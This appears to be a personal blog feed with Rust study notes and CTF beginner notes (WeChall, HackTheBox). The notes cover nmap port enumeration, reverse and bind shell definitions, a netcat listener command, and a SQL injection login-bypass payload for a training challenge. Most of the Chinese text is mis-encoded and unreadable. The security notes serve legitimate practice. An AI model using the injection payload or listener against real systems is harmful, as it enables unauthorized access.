String::from(<span class="string">"someone@example.com"</span>),</span><br><span class="line">        String::from(<span class="string">"someusername123"</span>),</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fn build_user(<span class="symbol">email:</span> String, <span class="symbol">username:</span> String) -&gt; User &#123;</span><br><span class="line">    User &#123;</span><br><span class="line">        email,  <span class="regexp">//</span>çœç•¥rather than <span class="symbol">email:</span> email.</span><br><span class="line">        username,</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ›´æ–°èµ‹äºˆå¦ä¸€å®ä¾‹</strong><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">"someone@example.com"</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">"someusername123"</span>),</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let user2 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">"another@example.com"</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">"anotherusername567"</span>),</span><br><span class="line">        ..user1  /<span class="regexp">/ .. specifies that the remaining fields not explicitly set should have the same value as the fields in the given instance.</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="tuple-struct"><a href="#tuple-struct" class="headerlink" title="tuple struct"></a>tuple struct</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    struct Color(i32, i32, i32);</span><br><span class="line">    struct Point(i32, i32, i32);</span><br><span class="line"></span><br><span class="line">    let black = Color(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    let origin = Point(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åšç½‘ç«™<br>æ–‡ä»¶è·¯å¾„çš„ä¸€äº›é€šç”¨è§„åˆ™ï¼š</p><p>è‹¥å¼•ç”¨çš„ç›®æ ‡æ–‡ä»¶ä¸ HTML æ–‡ä»¶åŒçº§ï¼Œåªéœ€ç›´æ¥ä½¿ç”¨æ–‡ä»¶åï¼Œæ¯”å¦‚ <code>my-image.jpg</code>ã€‚<br>è¦å¼•ç”¨å­æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶ï¼Œè¦åœ¨è·¯å¾„å‰å†™ä¸‹ç›®å½•åå¹¶åŠ ä¸€ä¸ªæ–œæ ï¼Œæ¯”å¦‚ <code>subdirectory/my-image.jpg</code>ã€‚<br>è‹¥å¼•ç”¨çš„ç›®æ ‡æ–‡ä»¶ä½äº HTML æ–‡ä»¶çš„ä¸Šçº§ï¼Œéœ€è¦åŠ ä¸Šä¸¤ä¸ªç‚¹ã€‚æ¯”å¦‚ï¼Œå¦‚æœ index.html åœ¨ test-site ä¸‹é¢çš„ä¸€ä¸ªå­ç›®å½•è€Œ my-image.png åœ¨ test-site ç›®å½•ï¼Œä½ å¯ä»¥åœ¨ index.html é‡Œä½¿ç”¨ <code>../my-image.png å¼•ç”¨ my-image.png</code>ã€‚<br>ä»¥ä¸Šæ–¹æ³•å¯ä»¥éšæ„ç»„åˆï¼Œæ¯”å¦‚ ../subdirectory/another-subdirectory/my-image.pngã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> RUST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RUSTå­¦ä¹ 1</title>
      <link href="/2020/07/27/RUST%E5%AD%A6%E4%B9%A01/"/>
      <url>/2020/07/27/RUST%E5%AD%A6%E4%B9%A01/</url>
      
        <content type="html"><![CDATA[<h3 id="è¿è¡Œå‘½ä»¤"><a href="#è¿è¡Œå‘½ä»¤" class="headerlink" title="è¿è¡Œå‘½ä»¤"></a>è¿è¡Œå‘½ä»¤</h3><p><code>cargo doc --open</code><br><code>rustup doc</code><br><code>cargo new --vcs=git</code><br><code>cargo build</code><br><code>cargo run</code><br><code>cargo check</code>æ›´å¿«ç¼–è¯‘ï¼Œä½†ä¸ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶<br><code>cargo build --release</code> ç”Ÿæˆçš„æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ›´å¿«<br>benchmarkåŸºå‡†æµ‹è¯•<br><a id="more"></a><br>Variables and Mutability<br>mutable æ˜“å˜çš„</p><p>let mut x=5</p><h6 id="rusté»˜è®¤å˜é‡ä¸å¯å˜"><a href="#rusté»˜è®¤å˜é‡ä¸å¯å˜" class="headerlink" title="rusté»˜è®¤å˜é‡ä¸å¯å˜"></a>rusté»˜è®¤å˜é‡ä¸å¯å˜</h6><p>fn main() {<br>const MAX_POINTS: u32 = 100_000;<br>}<br>const æ•´ä¸ªè¿è¡Œæ—¶é—´éƒ½å­˜åœ¨</p><p>fn main() {<br>    let spaces = â€œ   â€œ;<br>    let spaces = spaces.len();<br>}</p><h3 id="Data-Types"><a href="#Data-Types" class="headerlink" title="Data Types"></a>Data Types</h3><p>interger é»˜è®¤i32<br>float é»˜è®¤ f64<br>char â€˜â€™ 4å­—èŠ‚<em>Accented letters; Chinese, Japanese, and Korean characters; emoji; and zero-width spaces are all valid char values in Rust. </em><br>string â€œâ€</p><p>tuple å…ƒç»„ å›ºå®š ç±»å‹å¯ä»¥ä¸åŒ<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let tup: (i32, f64, u8) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let x: (i32, f64, u8) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    let five_hundred = x<span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">    let six_point_four = x<span class="number">.1</span>;</span><br><span class="line"></span><br><span class="line">    let one = x<span class="number">.2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>array æ•°ç»„ ç±»å‹ç›¸åŒ å›ºå®š å­˜åœ¨æ ˆä¸­<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> months = [<span class="string">"January"</span>, <span class="string">"February"</span>, <span class="string">"March"</span>, <span class="string">"April"</span>, <span class="string">"May"</span>, <span class="string">"June"</span>, <span class="string">"July"</span>,</span><br><span class="line">              <span class="string">"August"</span>, <span class="string">"September"</span>, <span class="string">"October"</span>, <span class="string">"November"</span>, <span class="string">"December"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> a: [i32; <span class="number">5</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">3</span>; <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> first = a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>rustä¼šæ£€æŸ¥ç´¢å¼•è·ƒå‡º</p><p>vector ä¸å›ºå®š</p><h3 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"Hello, world!"</span>);</span><br><span class="line"></span><br><span class="line">    another_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn another_function() &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"Another function."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Rust<code>doesnâ€™t care</code>where you define your functions, only that theyâ€™re defined somewhere.</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    another_function(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn another_function(x: i32, y: i32) &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of x is: &#123;&#125;"</span>, x);</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of y is: &#123;&#125;"</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¿…é¡»å£°æ˜å‚æ•°ç±»å‹</p><hr><p><code>Statements</code>are instructions that perform some action and do not return a value.<br>let y = 6; æ— è¿”å›å€¼ä¸èƒ½èµ‹ç»™å…¶ä»–å˜é‡<br><code>Expressions</code> evaluate to a resulting value.</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> y = &#123;</span><br><span class="line">        <span class="keyword">let</span> x = <span class="number">3</span>;</span><br><span class="line">        x + <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of y is: &#123;&#125;"</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Note the x + 1 line without a semicolon at the end, which is unlike most of the lines youâ€™ve seen so far. <strong>Expressions do not include ending semicolons.</strong> If you add a semicolon to the end of an expression, you turn it into a statement, which will then not return a value.</p><p>è¿”å›å€¼<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn five() -&gt; i32 &#123;</span><br><span class="line">    <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = five();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of x is: &#123;&#125;"</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = plus_one(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of x is: &#123;&#125;"</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn plus_one(x: i32) -&gt; i32 &#123;</span><br><span class="line">    x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h5><p>//</p><h3 id="control"><a href="#control" class="headerlink" title="control"></a>control</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number &lt; <span class="number">5</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"condition was true"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"condition was false"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Rust will <strong>not</strong> automatically try to <strong>convert non-Boolean types to a Boolean</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">4</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"number is divisible by 4"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">3</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"number is divisible by 3"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"number is divisible by 2"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"number is not divisible by 4, 3, or 2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> condition = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="keyword">if</span> condition &#123; <span class="number">5</span> &#125; <span class="keyword">else</span> &#123; <span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of number is: &#123;&#125;"</span>, number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h5><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    loop &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"again!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> mut counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> result = loop &#123;</span><br><span class="line">        counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">10</span> &#123;</span><br><span class="line">            <span class="keyword">break</span> counter * <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The result is &#123;&#125;"</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="while"><a href="#while" class="headerlink" title="while"></a>while</h6><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> mut number = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> number != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"&#123;&#125;!"</span>, number);</span><br><span class="line"></span><br><span class="line">        number -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"LIFTOFF!!!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="for"><a href="#for" class="headerlink" title="for"></a>for</h6><p> use a for loop and execute some code for each item in a collection<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> a.iter() &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"the value is: &#123;&#125;"</span>, element);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> (<span class="number">1</span>..<span class="number">4</span>).rev() &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"&#123;&#125;!"</span>, number);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"LIFTOFF!!!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>rev, to reverse the range</code></p><h3 id="guess-game-example"><a href="#guess-game-example" class="headerlink" title="guess game . example"></a>guess game . example</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println</span>!(<span class="string">"x = &#123;&#125; and y = &#123;&#125;"</span>, x, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cargo doc --open</code></p><p>The<strong> trim </strong>method on a String instance will eliminate any whitespace at the beginning and end<br>5\n å˜æˆ 5<br>The <strong>parse </strong>method on strings parses a string into some kind of number. </p><p>cargo fmt è‡ªåŠ¨è°ƒæ•´æ ¼å¼<br><a href="https://github.com/rust-lang/rustfmt" target="_blank" rel="noopener">https://github.com/rust-lang/rustfmt</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RUST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFå…¥é—¨ WECALL4+hackthebox-REVERSE</title>
      <link href="/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/"/>
      <url>/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/</url>
      
        <content type="html"><![CDATA[<h4 id="wechall-register-globals"><a href="#wechall-register-globals" class="headerlink" title="wechall register_globals"></a>wechall register_globals</h4><p>register_globals åœ¨php 5.4.0 åè¢«ç§»é™¤ å…¶ä¼šè‡ªåŠ¨ç”Ÿæˆå„ç§å˜é‡ å¦‚htmlè¯·æ±‚å˜é‡<br><a href="http://1.1.1.1/report.asp?id=123&amp;kehu=222" target="_blank" rel="noopener">http://1.1.1.1/report.asp?id=123&amp;kehu=222</a><br>login[0]=admin ç›´æ¥login=admin åªå–ç¬¬ä¸€ç¬¬äºŒä¸ªå­—ç¬¦</p><hr><h4 id="hackthebox"><a href="#hackthebox" class="headerlink" title="hackthebox"></a>hackthebox</h4><p>invite challenge æµè§ˆå™¨console ä¸‹è¿è¡Œå‡½æ•° åŠ ï¼ˆï¼‰<br>curl -X POST https://â€¦</p><a id="more"></a><hr><h4 id="hackthebox-â€“-Enumeration"><a href="#hackthebox-â€“-Enumeration" class="headerlink" title="hackthebox â€“ Enumeration"></a>hackthebox â€“ Enumeration</h4><p>ports=$(nmap -p- â€“min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d â€˜/â€˜ -f 1 | tr â€˜\nâ€™ â€˜,â€™ | sed s/,$//)<br>nmap -sC -sV -p$ports 10.10.10.27</p><p>command 1 | command 2 æŠŠç¬¬ä¸€ä¸ªå‘½ä»¤command 1æ‰§è¡Œçš„ç»“æœä½œä¸ºcommand 2çš„è¾“å…¥ä¼ ç»™command 2<br>-T4 å¯ä»¥åŠ å¿«æ‰§è¡Œé€Ÿåº¦<br>-p- æ‰«ææ‰€æœ‰ç«¯å£<br>-min-rate 1000 to request that Nmap send at least 1,000 packets per secondcut<br>cut Print selected parts of lines from each FILE to standard output.<br>-f æŒ‡å®šç¬¬ä¸€åˆ— -d æŒ‡å®šåˆ—åˆ†éš”ç¬¦<br> tr å‘½ä»¤ç”¨äºè½¬æ¢æˆ–åˆ é™¤æ–‡ä»¶ä¸­çš„å­—ç¬¦ â€˜\nâ€™ è½¬æ¢ä¸ºâ€˜ï¼Œâ€™<br>sed â€˜s/regexp/replacement/flagsâ€™.<br>Its basic concept is simple: the s command attempts to match the pattern space against the supplied regular expression regexp; if the match is successful, then that portion of the pattern space which was matched is replaced with replacement.<br>regexpåŒ¹é…æˆåŠŸåç”¨replaceæ›¿ä»£</p><p>select IS_SRVROLEMEMBER (â€˜sysadminâ€™)</p><hr><p>remote code execution (RCE)</p><h4 id="A-reverse-shell"><a href="#A-reverse-shell" class="headerlink" title="A reverse shell"></a>A reverse shell</h4><p>is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.</p><h4 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind shell"></a>Bind shell</h4><p>Bind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machineâ€™s listener which then leads to code or command execution on the server.</p><hr><p>netcat<br>nc -lvnp 443 ç›‘å¬æ¨¡å¼ 443 å¤–æ¥è¯·æ±‚</p><hr><h4 id="ollydbg"><a href="#ollydbg" class="headerlink" title="ollydbg"></a>ollydbg</h4><p>æ˜¾ç¤ºå½“å‰EIP *<br>æ‰§è¡Œåˆ°å…‰æ ‡ä½ç½® F4<br>F2 æ–­ç‚¹<br>CALL æŠŠæ¥ä¸‹æ¥çš„åœ°å€å…ˆå‹å…¥æ ˆ<br>win å‹å…¥å‚æ•°é€†åº f(a,b) å…ˆå‹b å a<br>test = and ä¸æ”¹å˜æ“ä½œæ•°å€¼</p><h4 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h4><p>file test.py</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFå…¥é—¨ WECALL2-æ­£åˆ™</title>
      <link href="/2020/07/06/CTF%E5%85%A5%E9%97%A8%20WECALL2/"/>
      <url>/2020/07/06/CTF%E5%85%A5%E9%97%A8%20WECALL2/</url>
      
        <content type="html"><![CDATA[<p>python3<br>list()   ä¸€ä¸ªå­—ç¬¦å­—ç¬¦åˆ†</p><hr><p>child[a],child[b] = child[b],child[a]</p><h5 id="äº¤æ¢ä½ç½®"><a href="#äº¤æ¢ä½ç½®" class="headerlink" title="äº¤æ¢ä½ç½®"></a>äº¤æ¢ä½ç½®</h5><a id="more"></a><hr><p>spilt() æŒ‰ç©ºæ ¼åˆ†<br>int()</p><hr><h3 id="Training-Crypto-Substitution-I"><a href="#Training-Crypto-Substitution-I" class="headerlink" title="Training: Crypto - Substitution I"></a>Training: Crypto - Substitution I</h3><p><a href="http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/" target="_blank" rel="noopener">http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/</a></p><h3 id="Training-Crypto-Caesar-II"><a href="#Training-Crypto-Caesar-II" class="headerlink" title="Training: Crypto - Caesar II"></a>Training: Crypto - Caesar II</h3><p>import sys<br>sys.stdout = open(â€˜/root/Documents/CTF_WECALL/results.pyâ€™, mode = â€˜wâ€™,encoding=â€™utf-8â€™)</p><p>æ‰“å°åˆ°æ–‡ä»¶ä¸­</p><p>line breaks. æ¢è¡Œç¬¦</p><p>vscode python æ•´æ®µå³ç§» é€‰ä¸­tab</p><hr><h3 id="python-2-è½¬åˆ°-3"><a href="#python-2-è½¬åˆ°-3" class="headerlink" title="python 2 è½¬åˆ° 3"></a>python 2 è½¬åˆ° 3</h3><p>2to3.py</p><hr><h3 id="æ­£åˆ™30åˆ†é’Ÿå­¦ä¹ "><a href="#æ­£åˆ™30åˆ†é’Ÿå­¦ä¹ " class="headerlink" title="æ­£åˆ™30åˆ†é’Ÿå­¦ä¹ "></a>æ­£åˆ™30åˆ†é’Ÿå­¦ä¹ </h3><p><a href="https://deerchao.cn/tutorials/regex/regex.htm" target="_blank" rel="noopener">https://deerchao.cn/tutorials/regex/regex.htm</a></p><h3 id="wechall-mysql-2"><a href="#wechall-mysql-2" class="headerlink" title="wechall mysql 2"></a>wechall mysql 2</h3><p>â€˜ union select 1,â€™adminâ€™ ,md5(â€˜1â€™)  from users where username =â€™adminâ€™#</p><p><code>ï¼Ÿï¼Ÿå¯ä»¥éšä¾¿é€‰æ‹©</code></p><h3 id="wechall-WWW-Basics"><a href="#wechall-WWW-Basics" class="headerlink" title="wechall WWW-Basics"></a>wechall WWW-Basics</h3><p>lsof -i:ç«¯å£å· 